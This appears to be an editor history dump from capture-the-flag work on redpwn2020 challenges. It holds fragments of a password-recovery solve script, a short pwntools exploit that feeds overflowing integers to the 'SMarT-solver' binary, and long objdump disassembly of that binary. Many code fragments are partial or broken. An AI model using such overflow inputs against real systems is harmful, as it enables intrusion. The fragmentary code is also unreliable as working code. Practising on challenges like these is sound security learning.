	        if l == l_rang and r == r_rang - 1:
	            password[r_rang] = val ^ v
	        elif l == l_rang and r == r_rang + 1: 
	            password[r] = val ^ v
	        elif r == r_rang and l == l_rang - 1:
	            password[l] = val ^ v
	        elif r == r_rang and l == l_rang + 1:
	            password[l_rang] = val ^ v
86ede15fa6c86b1b1b324c31ff5c40d8|file:///home/neo/CTFs/redpwn2020/expohash/solve.py|30|1|V|python
	            if l == left_limit - 1:
	                password[l] = v ^ value
491fe4b609478e6c752650fbb42d7cbb|file:///home/neo/CTFs/redpwn2020/expohash/solve.py|18|9|V|python
	        print(r_choices)
28cf03a326148353f84c15d6fa0392c3|file:///home/neo/CTFs/redpwn2020/expohash/solve.py|38|9|V|python
	for left in left_ranges:
	    if left is not None:
	        print(left)
d0ab3febddbda30abee28aaa4ab2a587|file:///home/neo/CTFs/redpwn2020/expohash/solve.py|18|1|V|python
	                print((l,r), (l, right_limit))
163998716e922dec9237ac2504d41afa|file:///home/neo/CTFs/redpwn2020/expohash/solve.py|31|1|V|python
	                print((l,r), (left_limit, r))
2de0c62401d49ab9d5a0a1fdae52b64f|file:///home/neo/CTFs/redpwn2020/expohash/solve.py|31|17|V|python
	                # print((l,r), (left_limit, r))
f604b427ecf46fff0da84e21317c33d6|file:///home/neo/CTFs/redpwn2020/expohash/solve.py|19|1|V|python
	                found.add(right_limit)
73273b458764e7cd3c3478ab3d68ab82|file:///home/neo/CTFs/redpwn2020/expohash/solve.py|22|28|v|python
	ight_limit
d3cde8b0941208c096e88bd682571bb0|file:///home/neo/CTFs/redpwn2020/expohash/solve.py|22|1|V|python
	                found.add(r)
767b0058c9e6912a93b134dd3533046c|file:///home/neo/CTFs/redpwn2020/expohash/solve.py|32|1|V|python
	                found.add(l)
1fc788285d0b311ee90084353e072b7c|file:///home/neo/CTFs/redpwn2020/expohash/solve.py|41|5|V|python
	    unknown = 0
7205f19579f645872eee93287e667fc1|file:///home/neo/CTFs/redpwn2020/expohash/solve.py|45|1|V|python
	                unknown = 0
	                found_pos = -1
	                total_xor = 0
6252ace4e8f74d0194804010ce7ccf46|file:///home/neo/CTFs/redpwn2020/expohash/solve.py|48|1|V|python
	                for pos in range(i, right_limit):
	                    if pos not in found:
	                        unknown += 1
	                        found_pos = pos
	                    else:
	                        total_xor ^= password[pos]
	                if unknown == 1:
	                    password[found_pos] = value ^ total_xor
	                    found.add(found_pos)
729fcc2ecb23cb1784ed502d0194d28d|file:///home/neo/CTFs/redpwn2020/expohash/solve.py|75|1|V|python
	for i,p in enumerate(password):
	    if p != '?':
	        print(i, p)
ddda39f2edef0b863bbf00bdcc0b4561|file:///home/neo/CTFs/redpwn2020/expohash/solve.py|44|1|V|python
	print('----------------')
c227a82b56284ffba75b034169be8b41|file:///home/neo/CTFs/redpwn2020/expohash/solve.py|82|5|V|python
	    print(found)
86258b17fea72edb5340fb1b04e93c85|file:///home/neo/CTFs/redpwn2020/expohash/solve.py|79|1|V|python
	    print('----------------')
8a19236c0a179c06c2bfe94c866e5ad6|file:///home/neo/CTFs/redpwn2020/expohash/solve.py|79|5|V|python
	    print('----------------')
	    for i,p in enumerate(password):
	        if p != '?':
	            print(i, p)
	    print('----------------')
a214fd788c66f010e75c13968aa0ff15|file:///home/neo/CTFs/redpwn2020/expohash/solve.py|39|1|V|python
	
	for i,p in enumerate(password):
	    if p != '?':
	        print(i, p)
1195fa376d103e9bb92084367dfab596|file:///home/neo/CTFs/redpwn2020/expohash/solve.py|59|25|V|python
	                        right_ranges[found_pos][]
2688b47b88b607581d586e8f973ea946|file:///home/neo/CTFs/redpwn2020/expohash/solve.py|59|24|V|python
	                        
85bb7cb447fe61cb1556ad4d5eca7bb0|file:///home/neo/CTFs/redpwn2020/expohash/solve.py|59|42|V|python
	                        if found_pos == i:
	                            left_ranges[i][right_limit] = 
48a1f580c46c382bab53688eec6823a1|file:///home/neo/CTFs/redpwn2020/expohash/solve.py|42|5|V|python
	    print(len(found))
6cba4346401dad721b8a68f43879d4cc|file:///home/neo/CTFs/redpwn2020/expohash/solve.py|84|1|V|python
	    print)
5c052abc053e3adc17789bc8c56f4e2b|file:///home/neo/CTFs/redpwn2020/expohash/solve.py|80|25|V|python
	for i,p in enumerate(password):
	    if p != '?':
	        print(i, p)
	print('----------------')
fbda63544c5f72f2cb1c30eb1bf00f76|file:///home/neo/CTFs/redpwn2020/expohash/solve.py|46|1|V|python
	                print("Left: ", i)
945d5e233cf7d6240f6b783b36a374ff|file:///home/neo/CTFs/redpwn2020/expohash/solve.py|63|24|v|python
	Left
20c05a655209e636ef8373e83c8776ad|file:///home/neo/CTFs/redpwn2020/expohash/solve.py|42|9|V|python
	        left_limits = left_ranges[f]
19d8ef8a0ebce56a9e7fd3d17f23d58e|file:///home/neo/CTFs/redpwn2020/expohash/solve.py|48|9|V|python
	        for right_limit, value in left_limits:
ec267f7fa496669014b7479a6ca7c8b8|file:///home/neo/CTFs/redpwn2020/expohash/solve.py|47|13|V|python
	            left_limits = left_ranges[inc]
aa9ad0e2bb788bb4e0c3d770d63b7467|file:///home/neo/CTFs/redpwn2020/expohash/solve.py|46|1|V|python
	                for pos in range(dec, f, 1):
	                    new_val ^= password[pos]
ca1898a2582df07a8c7f1a811b977fbb|file:///home/neo/CTFs/redpwn2020/expohash/solve.py|44|1|V|python
	            print(left_ranges[dec])
0ab560a46040467e763054066f951bf4|file:///home/neo/CTFs/redpwn2020/smartsolver/exploit.py|51|1|V|python
	# Round 1
	# Can't give '-' sign, so we give max int(+) to overflow
	io.sendlineafter('x: ', str(MAX_INT + 0x53a))
	io.sendlineafter('y: ', str(MAX_INT + 1))
	
	# Round 2
	# Again, overflow max int
	io.recvuntil('=== t00leet ===')
	io.sendline(str(MAX_INT) + " " + str(MAX_INT - 0x538))
	
	# Round 3 lol
	io.recvuntil("=== 3leet ===")
	payload = ('0')
	payload += (' ')
	payload += ('0')
	payload += (' ')
	payload += ('0')
	payload += (' ')
	payload += ('0')
	payload += (' ')
	payload += ('0')
	io.sendline(payload)
37dfefafe4a2a5f23a4ba2880abca9a2|file:///home/neo/CTFs/redpwn2020/smartsolver/exploit.py|56|1|V|python
	line = io.recvline_contains('Enter')
7a6798fc5b5d2ed271b1676bd4831245|file:///home/neo/CTFs/redpwn2020/smartsolver/code.asm|1|1|V|asm
	
	SMarT-solver:     file format elf64-x86-64
	
	
	Disassembly of section .init:
	
	00000000000006a8 <_init>:
	 6a8:	48 83 ec 08          	sub    $0x8,%rsp
	 6ac:	48 8b 05 35 39 22 00 	mov    0x223935(%rip),%rax        # 223fe8 <__gmon_start__>
	 6b3:	48 85 c0             	test   %rax,%rax
	 6b6:	74 02                	je     6ba <_init+0x12>
	 6b8:	ff d0                	callq  *%rax
	 6ba:	48 83 c4 08          	add    $0x8,%rsp
	 6be:	c3                   	retq   
	
	Disassembly of section .plt:
	
	00000000000006c0 <.plt>:
	 6c0:	ff 35 ca 38 22 00    	pushq  0x2238ca(%rip)        # 223f90 <_GLOBAL_OFFSET_TABLE_+0x8>
	 6c6:	ff 25 cc 38 22 00    	jmpq   *0x2238cc(%rip)        # 223f98 <_GLOBAL_OFFSET_TABLE_+0x10>
	 6cc:	0f 1f 40 00          	nopl   0x0(%rax)
	
	00000000000006d0 <puts@plt>:
	 6d0:	ff 25 ca 38 22 00    	jmpq   *0x2238ca(%rip)        # 223fa0 <puts@GLIBC_2.2.5>
	 6d6:	68 00 00 00 00       	pushq  $0x0
	 6db:	e9 e0 ff ff ff       	jmpq   6c0 <.plt>
	
	00000000000006e0 <strlen@plt>:
	 6e0:	ff 25 c2 38 22 00    	jmpq   *0x2238c2(%rip)        # 223fa8 <strlen@GLIBC_2.2.5>
	 6e6:	68 01 00 00 00       	pushq  $0x1
	 6eb:	e9 d0 ff ff ff       	jmpq   6c0 <.plt>
	
	00000000000006f0 <__stack_chk_fail@plt>:
	 6f0:	ff 25 ba 38 22 00    	jmpq   *0x2238ba(%rip)        # 223fb0 <__stack_chk_fail@GLIBC_2.4>
	 6f6:	68 02 00 00 00       	pushq  $0x2
	 6fb:	e9 c0 ff ff ff       	jmpq   6c0 <.plt>
	
	0000000000000700 <printf@plt>:
	 700:	ff 25 b2 38 22 00    	jmpq   *0x2238b2(%rip)        # 223fb8 <printf@GLIBC_2.2.5>
	 706:	68 03 00 00 00       	pushq  $0x3
	 70b:	e9 b0 ff ff ff       	jmpq   6c0 <.plt>
	
	0000000000000710 <memset@plt>:
	 710:	ff 25 aa 38 22 00    	jmpq   *0x2238aa(%rip)        # 223fc0 <memset@GLIBC_2.2.5>
	 716:	68 04 00 00 00       	pushq  $0x4
	 71b:	e9 a0 ff ff ff       	jmpq   6c0 <.plt>
	
	0000000000000720 <fgets@plt>:
	 720:	ff 25 a2 38 22 00    	jmpq   *0x2238a2(%rip)        # 223fc8 <fgets@GLIBC_2.2.5>
	 726:	68 05 00 00 00       	pushq  $0x5
	 72b:	e9 90 ff ff ff       	jmpq   6c0 <.plt>
	
	0000000000000730 <isalpha@plt>:
	 730:	ff 25 9a 38 22 00    	jmpq   *0x22389a(%rip)        # 223fd0 <isalpha@GLIBC_2.2.5>
	 736:	68 06 00 00 00       	pushq  $0x6
	 73b:	e9 80 ff ff ff       	jmpq   6c0 <.plt>
	
	Disassembly of section .plt.got:
	
	0000000000000740 <__cxa_finalize@plt>:
	 740:	ff 25 b2 38 22 00    	jmpq   *0x2238b2(%rip)        # 223ff8 <__cxa_finalize@GLIBC_2.2.5>
	 746:	66 90                	xchg   %ax,%ax
	
	Disassembly of section .text:
	
	0000000000000750 <_start>:
	     750:	31 ed                	xor    %ebp,%ebp
	     752:	49 89 d1             	mov    %rdx,%r9
	     755:	5e                   	pop    %rsi
	     756:	48 89 e2             	mov    %rsp,%rdx
	     759:	48 83 e4 f0          	and    $0xfffffffffffffff0,%rsp
	     75d:	50                   	push   %rax
	     75e:	54                   	push   %rsp
	     75f:	4c 8d 05 5a 28 02 00 	lea    0x2285a(%rip),%r8        # 22fc0 <__libc_csu_fini>
	     766:	48 8d 0d e3 27 02 00 	lea    0x227e3(%rip),%rcx        # 22f50 <__libc_csu_init>
	     76d:	48 8d 3d e6 00 00 00 	lea    0xe6(%rip),%rdi        # 85a <main>
	     774:	ff 15 66 38 22 00    	callq  *0x223866(%rip)        # 223fe0 <__libc_start_main@GLIBC_2.2.5>
	     77a:	f4                   	hlt    
	     77b:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
	
	0000000000000780 <deregister_tm_clones>:
	     780:	48 8d 3d 89 38 22 00 	lea    0x223889(%rip),%rdi        # 224010 <stdin@@GLIBC_2.2.5>
	     787:	55                   	push   %rbp
	     788:	48 8d 05 81 38 22 00 	lea    0x223881(%rip),%rax        # 224010 <stdin@@GLIBC_2.2.5>
	     78f:	48 39 f8             	cmp    %rdi,%rax
	     792:	48 89 e5             	mov    %rsp,%rbp
	     795:	74 19                	je     7b0 <deregister_tm_clones+0x30>
	     797:	48 8b 05 3a 38 22 00 	mov    0x22383a(%rip),%rax        # 223fd8 <_ITM_deregisterTMCloneTable>
	     79e:	48 85 c0             	test   %rax,%rax
	     7a1:	74 0d                	je     7b0 <deregister_tm_clones+0x30>
	     7a3:	5d                   	pop    %rbp
	     7a4:	ff e0                	jmpq   *%rax
	     7a6:	66 2e 0f 1f 84 00 00 	nopw   %cs:0x0(%rax,%rax,1)
	     7ad:	00 00 00 
	     7b0:	5d                   	pop    %rbp
	     7b1:	c3                   	retq   
	     7b2:	0f 1f 40 00          	nopl   0x0(%rax)
	     7b6:	66 2e 0f 1f 84 00 00 	nopw   %cs:0x0(%rax,%rax,1)
	     7bd:	00 00 00 
	
	00000000000007c0 <register_tm_clones>:
	     7c0:	48 8d 3d 49 38 22 00 	lea    0x223849(%rip),%rdi        # 224010 <stdin@@GLIBC_2.2.5>
	     7c7:	48 8d 35 42 38 22 00 	lea    0x223842(%rip),%rsi        # 224010 <stdin@@GLIBC_2.2.5>
	     7ce:	55                   	push   %rbp
	     7cf:	48 29 fe             	sub    %rdi,%rsi
	     7d2:	48 89 e5             	mov    %rsp,%rbp
	     7d5:	48 c1 fe 03          	sar    $0x3,%rsi
	     7d9:	48 89 f0             	mov    %rsi,%rax
	     7dc:	48 c1 e8 3f          	shr    $0x3f,%rax
	     7e0:	48 01 c6             	add    %rax,%rsi
	     7e3:	48 d1 fe             	sar    %rsi
	     7e6:	74 18                	je     800 <register_tm_clones+0x40>
	     7e8:	48 8b 05 01 38 22 00 	mov    0x223801(%rip),%rax        # 223ff0 <_ITM_registerTMCloneTable>
	     7ef:	48 85 c0             	test   %rax,%rax
	     7f2:	74 0c                	je     800 <register_tm_clones+0x40>
	     7f4:	5d                   	pop    %rbp
	     7f5:	ff e0                	jmpq   *%rax
	     7f7:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
	     7fe:	00 00 
	     800:	5d                   	pop    %rbp
	     801:	c3                   	retq   
	     802:	0f 1f 40 00          	nopl   0x0(%rax)
	     806:	66 2e 0f 1f 84 00 00 	nopw   %cs:0x0(%rax,%rax,1)
	     80d:	00 00 00 
	
	0000000000000810 <__do_global_dtors_aux>:
	     810:	80 3d 01 38 22 00 00 	cmpb   $0x0,0x223801(%rip)        # 224018 <completed.7697>
	     817:	75 2f                	jne    848 <__do_global_dtors_aux+0x38>
	     819:	48 83 3d d7 37 22 00 	cmpq   $0x0,0x2237d7(%rip)        # 223ff8 <__cxa_finalize@GLIBC_2.2.5>
	     820:	00 
	     821:	55                   	push   %rbp
	     822:	48 89 e5             	mov    %rsp,%rbp
	     825:	74 0c                	je     833 <__do_global_dtors_aux+0x23>
	     827:	48 8b 3d da 37 22 00 	mov    0x2237da(%rip),%rdi        # 224008 <__dso_handle>
	     82e:	e8 0d ff ff ff       	callq  740 <__cxa_finalize@plt>
	     833:	e8 48 ff ff ff       	callq  780 <deregister_tm_clones>
	     838:	c6 05 d9 37 22 00 01 	movb   $0x1,0x2237d9(%rip)        # 224018 <completed.7697>
	     83f:	5d                   	pop    %rbp
	     840:	c3                   	retq   
	     841:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
	     848:	f3 c3                	repz retq 
	     84a:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
	
	0000000000000850 <frame_dummy>:
	     850:	55                   	push   %rbp
	     851:	48 89 e5             	mov    %rsp,%rbp
	     854:	5d                   	pop    %rbp
	     855:	e9 66 ff ff ff       	jmpq   7c0 <register_tm_clones>
	
2096e5b8e04a582c9437f5f76ec13e10|file:///home/neo/CTFs/redpwn2020/smartsolver/code.asm|30299|1|V|asm
	
	0000000000022fc0 <__libc_csu_fini>:
	   22fc0:	f3 c3                	repz retq 
	
	Disassembly of section .fini:
	
	0000000000022fc4 <_fini>:
	   22fc4:	48 83 ec 08          	sub    $0x8,%rsp
	   22fc8:	48 83 c4 08          	add    $0x8,%rsp
	   22fcc:	c3                   	retq   
23556a6fc453d77874d9a3bbef1c3d7c|file:///home/neo/CTFs/redpwn2020/smartsolver/code.asm|30259|1|V|asm
	
	0000000000022f50 <__libc_csu_init>:
	   22f50:	41 57                	push   %r15
	   22f52:	41 56                	push   %r14
	   22f54:	49 89 d7             	mov    %rdx,%r15
	   22f57:	41 55                	push   %r13
	   22f59:	41 54                	push   %r12
	   22f5b:	4c 8d 25 26 0e 20 00 	lea    0x200e26(%rip),%r12        # 223d88 <__frame_dummy_init_array_entry>
	   22f62:	55                   	push   %rbp
	   22f63:	48 8d 2d 26 0e 20 00 	lea    0x200e26(%rip),%rbp        # 223d90 <__init_array_end>
	   22f6a:	53                   	push   %rbx
	   22f6b:	41 89 fd             	mov    %edi,%r13d
	   22f6e:	49 89 f6             	mov    %rsi,%r14
	   22f71:	4c 29 e5             	sub    %r12,%rbp
	   22f74:	48 83 ec 08          	sub    $0x8,%rsp
	   22f78:	48 c1 fd 03          	sar    $0x3,%rbp
	   22f7c:	e8 27 d7 fd ff       	callq  6a8 <_init>
	   22f81:	48 85 ed             	test   %rbp,%rbp
	   22f84:	74 20                	je     22fa6 <__libc_csu_init+0x56>
	   22f86:	31 db                	xor    %ebx,%ebx
	   22f88:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
	   22f8f:	00 
	   22f90:	4c 89 fa             	mov    %r15,%rdx
	   22f93:	4c 89 f6             	mov    %r14,%rsi
	   22f96:	44 89 ef             	mov    %r13d,%edi
	   22f99:	41 ff 14 dc          	callq  *(%r12,%rbx,8)
	   22f9d:	48 83 c3 01          	add    $0x1,%rbx
	   22fa1:	48 39 dd             	cmp    %rbx,%rbp
	   22fa4:	75 ea                	jne    22f90 <__libc_csu_init+0x40>
	   22fa6:	48 83 c4 08          	add    $0x8,%rsp
	   22faa:	5b                   	pop    %rbx
	   22fab:	5d                   	pop    %rbp
	   22fac:	41 5c                	pop    %r12
	   22fae:	41 5d                	pop    %r13
	   22fb0:	41 5e                	pop    %r14
	   22fb2:	41 5f                	pop    %r15
	   22fb4:	c3                   	retq   
	   22fb5:	90                   	nop
	   22fb6:	66 2e 0f 1f 84 00 00 	nopw   %cs:0x0(%rax,%rax,1)
	   22fbd:	00 00 00 
229c6b9bf8e63f7e42d6d5c220211ba2|file:///home/neo/CTFs/redpwn2020/smartsolver/code.asm|1|1|V|asm
	000000000000085a <main>:
75358481485bef1b91ba2d3eb9f53095|file:///home/neo/CTFs/redpwn2020/smartsolver/main.asm|1|1|V|asm
	
	SMarT-solver:     file format elf64-x86-64
	
	
	Disassembly of section .init:
	
	00000000000006a8 <_init>:
	 6a8:	48 83 ec 08          	sub    rsp,0x8
	 6ac:	48 8b 05 35 39 22 00 	mov    rax,QWORD PTR [rip+0x223935]        # 223fe8 <__gmon_start__>
	 6b3:	48 85 c0             	test   rax,rax
	 6b6:	74 02                	je     6ba <_init+0x12>
	 6b8:	ff d0                	call   rax
	 6ba:	48 83 c4 08          	add    rsp,0x8
	 6be:	c3                   	ret    
	
	Disassembly of section .plt:
	
	00000000000006c0 <.plt>:
	 6c0:	ff 35 ca 38 22 00    	push   QWORD PTR [rip+0x2238ca]        # 223f90 <_GLOBAL_OFFSET_TABLE_+0x8>
	 6c6:	ff 25 cc 38 22 00    	jmp    QWORD PTR [rip+0x2238cc]        # 223f98 <_GLOBAL_OFFSET_TABLE_+0x10>
	 6cc:	0f 1f 40 00          	nop    DWORD PTR [rax+0x0]
	
	00000000000006d0 <puts@plt>:
	 6d0:	ff 25 ca 38 22 00    	jmp    QWORD PTR [rip+0x2238ca]        # 223fa0 <puts@GLIBC_2.2.5>
	 6d6:	68 00 00 00 00       	push   0x0
	 6db:	e9 e0 ff ff ff       	jmp    6c0 <.plt>
	
	00000000000006e0 <strlen@plt>:
	 6e0:	ff 25 c2 38 22 00    	jmp    QWORD PTR [rip+0x2238c2]        # 223fa8 <strlen@GLIBC_2.2.5>
	 6e6:	68 01 00 00 00       	push   0x1
	 6eb:	e9 d0 ff ff ff       	jmp    6c0 <.plt>
	
	00000000000006f0 <__stack_chk_fail@plt>:
	 6f0:	ff 25 ba 38 22 00    	jmp    QWORD PTR [rip+0x2238ba]        # 223fb0 <__stack_chk_fail@GLIBC_2.4>
	 6f6:	68 02 00 00 00       	push   0x2
	 6fb:	e9 c0 ff ff ff       	jmp    6c0 <.plt>
	
	0000000000000700 <printf@plt>:
	 700:	ff 25 b2 38 22 00    	jmp    QWORD PTR [rip+0x2238b2]        # 223fb8 <printf@GLIBC_2.2.5>
	 706:	68 03 00 00 00       	push   0x3
	 70b:	e9 b0 ff ff ff       	jmp    6c0 <.plt>
	
	0000000000000710 <memset@plt>:
	 710:	ff 25 aa 38 22 00    	jmp    QWORD PTR [rip+0x2238aa]        # 223fc0 <memset@GLIBC_2.2.5>
	 716:	68 04 00 00 00       	push   0x4
	 71b:	e9 a0 ff ff ff       	jmp    6c0 <.plt>
	
	0000000000000720 <fgets@plt>:
	 720:	ff 25 a2 38 22 00    	jmp    QWORD PTR [rip+0x2238a2]        # 223fc8 <fgets@GLIBC_2.2.5>
	 726:	68 05 00 00 00       	push   0x5
	 72b:	e9 90 ff ff ff       	jmp    6c0 <.plt>
	
	0000000000000730 <isalpha@plt>:
	 730:	ff 25 9a 38 22 00    	jmp    QWORD PTR [rip+0x22389a]        # 223fd0 <isalpha@GLIBC_2.2.5>
	 736:	68 06 00 00 00       	push   0x6
	 73b:	e9 80 ff ff ff       	jmp    6c0 <.plt>
	
	Disassembly of section .plt.got:
	
	0000000000000740 <__cxa_finalize@plt>:
	 740:	ff 25 b2 38 22 00    	jmp    QWORD PTR [rip+0x2238b2]        # 223ff8 <__cxa_finalize@GLIBC_2.2.5>
	 746:	66 90                	xchg   ax,ax
	
	Disassembly of section .text:
	
	0000000000000750 <_start>:
	     750:	31 ed                	xor    ebp,ebp
	     752:	49 89 d1             	mov    r9,rdx
	     755:	5e                   	pop    rsi
	     756:	48 89 e2             	mov    rdx,rsp
	     759:	48 83 e4 f0          	and    rsp,0xfffffffffffffff0
	     75d:	50                   	push   rax
	     75e:	54                   	push   rsp
	     75f:	4c 8d 05 5a 28 02 00 	lea    r8,[rip+0x2285a]        # 22fc0 <__libc_csu_fini>
	     766:	48 8d 0d e3 27 02 00 	lea    rcx,[rip+0x227e3]        # 22f50 <__libc_csu_init>
	     76d:	48 8d 3d e6 00 00 00 	lea    rdi,[rip+0xe6]        # 85a <main>
	     774:	ff 15 66 38 22 00    	call   QWORD PTR [rip+0x223866]        # 223fe0 <__libc_start_main@GLIBC_2.2.5>
	     77a:	f4                   	hlt    
	     77b:	0f 1f 44 00 00       	nop    DWORD PTR [rax+rax*1+0x0]
	
	0000000000000780 <deregister_tm_clones>:
	     780:	48 8d 3d 89 38 22 00 	lea    rdi,[rip+0x223889]        # 224010 <stdin@@GLIBC_2.2.5>
	     787:	55                   	push   rbp
	     788:	48 8d 05 81 38 22 00 	lea    rax,[rip+0x223881]        # 224010 <stdin@@GLIBC_2.2.5>
	     78f:	48 39 f8             	cmp    rax,rdi
	     792:	48 89 e5             	mov    rbp,rsp
	     795:	74 19                	je     7b0 <deregister_tm_clones+0x30>
	     797:	48 8b 05 3a 38 22 00 	mov    rax,QWORD PTR [rip+0x22383a]        # 223fd8 <_ITM_deregisterTMCloneTable>
	     79e:	48 85 c0             	test   rax,rax
	     7a1:	74 0d                	je     7b0 <deregister_tm_clones+0x30>
	     7a3:	5d                   	pop    rbp
	     7a4:	ff e0                	jmp    rax
	     7a6:	66 2e 0f 1f 84 00 00 	nop    WORD PTR cs:[rax+rax*1+0x0]
	     7ad:	00 00 00 
	     7b0:	5d                   	pop    rbp
	     7b1:	c3                   	ret    
	     7b2:	0f 1f 40 00          	nop    DWORD PTR [rax+0x0]
	     7b6:	66 2e 0f 1f 84 00 00 	nop    WORD PTR cs:[rax+rax*1+0x0]
	     7bd:	00 00 00 
	
	00000000000007c0 <register_tm_clones>:
	     7c0:	48 8d 3d 49 38 22 00 	lea    rdi,[rip+0x223849]        # 224010 <stdin@@GLIBC_2.2.5>
	     7c7:	48 8d 35 42 38 22 00 	lea    rsi,[rip+0x223842]        # 224010 <stdin@@GLIBC_2.2.5>
	     7ce:	55                   	push   rbp
	     7cf:	48 29 fe             	sub    rsi,rdi
	     7d2:	48 89 e5             	mov    rbp,rsp
	     7d5:	48 c1 fe 03          	sar    rsi,0x3
	     7d9:	48 89 f0             	mov    rax,rsi
	     7dc:	48 c1 e8 3f          	shr    rax,0x3f
	     7e0:	48 01 c6             	add    rsi,rax
	     7e3:	48 d1 fe             	sar    rsi,1
	     7e6:	74 18                	je     800 <register_tm_clones+0x40>
	     7e8:	48 8b 05 01 38 22 00 	mov    rax,QWORD PTR [rip+0x223801]        # 223ff0 <_ITM_registerTMCloneTable>
	     7ef:	48 85 c0             	test   rax,rax
	     7f2:	74 0c                	je     800 <register_tm_clones+0x40>
	     7f4:	5d                   	pop    rbp
	     7f5:	ff e0                	jmp    rax
	     7f7:	66 0f 1f 84 00 00 00 	nop    WORD PTR [rax+rax*1+0x0]
	     7fe:	00 00 
	     800:	5d                   	pop    rbp
	     801:	c3                   	ret    
	     802:	0f 1f 40 00          	nop    DWORD PTR [rax+0x0]
	     806:	66 2e 0f 1f 84 00 00 	nop    WORD PTR cs:[rax+rax*1+0x0]
	     80d:	00 00 00 
	
	0000000000000810 <__do_global_dtors_aux>:
	     810:	80 3d 01 38 22 00 00 	cmp    BYTE PTR [rip+0x223801],0x0        # 224018 <completed.7697>
	     817:	75 2f                	jne    848 <__do_global_dtors_aux+0x38>
	     819:	48 83 3d d7 37 22 00 	cmp    QWORD PTR [rip+0x2237d7],0x0        # 223ff8 <__cxa_finalize@GLIBC_2.2.5>
	     820:	00 
	     821:	55                   	push   rbp
	     822:	48 89 e5             	mov    rbp,rsp
	     825:	74 0c                	je     833 <__do_global_dtors_aux+0x23>
	     827:	48 8b 3d da 37 22 00 	mov    rdi,QWORD PTR [rip+0x2237da]        # 224008 <__dso_handle>
	     82e:	e8 0d ff ff ff       	call   740 <__cxa_finalize@plt>
	     833:	e8 48 ff ff ff       	call   780 <deregister_tm_clones>
	     838:	c6 05 d9 37 22 00 01 	mov    BYTE PTR [rip+0x2237d9],0x1        # 224018 <completed.7697>
	     83f:	5d                   	pop    rbp
	     840:	c3                   	ret    
	     841:	0f 1f 80 00 00 00 00 	nop    DWORD PTR [rax+0x0]
	     848:	f3 c3                	repz ret 
	     84a:	66 0f 1f 44 00 00    	nop    WORD PTR [rax+rax*1+0x0]
	
	0000000000000850 <frame_dummy>:
	     850:	55                   	push   rbp
	     851:	48 89 e5             	mov    rbp,rsp
	     854:	5d                   	pop    rbp
	     855:	e9 66 ff ff ff       	jmp    7c0 <register_tm_clones>
	
	000000000000085a <main>:
b4392e2bb58ad1d461c35053c65d1408|file:///home/neo/CTFs/redpwn2020/smartsolver/main.asm|30258|1|V|asm
	
	0000000000022f50 <__libc_csu_init>:
	   22f50:	41 57                	push   r15
	   22f52:	41 56                	push   r14
	   22f54:	49 89 d7             	mov    r15,rdx
	   22f57:	41 55                	push   r13
	   22f59:	41 54                	push   r12
	   22f5b:	4c 8d 25 26 0e 20 00 	lea    r12,[rip+0x200e26]        # 223d88 <__frame_dummy_init_array_entry>
	   22f62:	55                   	push   rbp
	   22f63:	48 8d 2d 26 0e 20 00 	lea    rbp,[rip+0x200e26]        # 223d90 <__init_array_end>
	   22f6a:	53                   	push   rbx
	   22f6b:	41 89 fd             	mov    r13d,edi
	   22f6e:	49 89 f6             	mov    r14,rsi
	   22f71:	4c 29 e5             	sub    rbp,r12
	   22f74:	48 83 ec 08          	sub    rsp,0x8
	   22f78:	48 c1 fd 03          	sar    rbp,0x3
	   22f7c:	e8 27 d7 fd ff       	call   6a8 <_init>
	   22f81:	48 85 ed             	test   rbp,rbp
	   22f84:	74 20                	je     22fa6 <__libc_csu_init+0x56>
	   22f86:	31 db                	xor    ebx,ebx
	   22f88:	0f 1f 84 00 00 00 00 	nop    DWORD PTR [rax+rax*1+0x0]
	   22f8f:	00 
	   22f90:	4c 89 fa             	mov    rdx,r15
	   22f93:	4c 89 f6             	mov    rsi,r14
	   22f96:	44 89 ef             	mov    edi,r13d
	   22f99:	41 ff 14 dc          	call   QWORD PTR [r12+rbx*8]
	   22f9d:	48 83 c3 01          	add    rbx,0x1
	   22fa1:	48 39 dd             	cmp    rbp,rbx
	   22fa4:	75 ea                	jne    22f90 <__libc_csu_init+0x40>
	   22fa6:	48 83 c4 08          	add    rsp,0x8
	   22faa:	5b                   	pop    rbx
	   22fab:	5d                   	pop    rbp
	   22fac:	41 5c                	pop    r12
	   22fae:	41 5d                	pop    r13
	   22fb0:	41 5e                	pop    r14
	   22fb2:	41 5f                	pop    r15
	   22fb4:	c3                   	ret    
	   22fb5:	90                   	nop
	   22fb6:	66 2e 0f 1f 84 00 00 	nop    WORD PTR cs:[rax+rax*1+0x0]
	   22fbd:	00 00 00 
	
	0000000000022fc0 <__libc_csu_fini>:
	   22fc0:	f3 c3                	repz ret 
	
	Disassembly of section .fini:
	
	0000000000022fc4 <_fini>:
	   22fc4:	48 83 ec 08          	sub    rsp,0x8
	   22fc8:	48 83 c4 08          	add    rsp,0x8
	   22fcc:	c3                   	ret    
66404f67f8a0e392750e087da534a7bf|file:///home/neo/CTFs/redpwn2020/smartsolver/restr.asm|1|1|V|asm
	     85a:	push   rbp
	     85b:	mov    rbp,rsp
	     85e:	push   rbx
	     85f:	sub    rsp,0x138
	     866:	mov    DWORD PTR [rbp-0x134],edi
	     86c:	mov    QWORD PTR [rbp-0x140],rsi
	     873:	mov    rax,QWORD PTR fs:0x28
	     87a:
	     87c:	mov    QWORD PTR [rbp-0x18],rax
	     880:	xor    eax,eax
	     882:	lea    rdi,[rip+0x2274f]        # 22fd8 <_IO_stdin_used+0x8>
	     889:	call   6d0 <puts@plt>
	     88e:	lea    rdi,[rip+0x2278b]        # 23020 <_IO_stdin_used+0x50>
	     895:	mov    eax,0x0
	     89a:	call   700 <printf@plt>
	     89f:	lea    rax,[rbp-0x120]
	     8a6:	mov    edx,0x100
	     8ab:	mov    esi,0x0
	     8b0:	mov    rdi,rax
	     8b3:	call   710 <memset@plt>
	     8b8:	mov    rdx,QWORD PTR [rip+0x223751]        # 224010 <stdin@@GLIBC_2.2.5>
	     8bf:	lea    rax,[rbp-0x120]
	     8c6:	mov    esi,0x100
	     8cb:	mov    rdi,rax
	     8ce:	call   720 <fgets@plt>
	     8d3:	lea    rax,[rbp-0x120]
	     8da:	mov    rdi,rax
	     8dd:	call   6e0 <strlen@plt>
	     8e2:	sub    rax,0x1
	     8e6:	movzx  eax,BYTE PTR [rbp+rax*1-0x120]
	     8ed:
	     8ee:	cmp    al,0xa
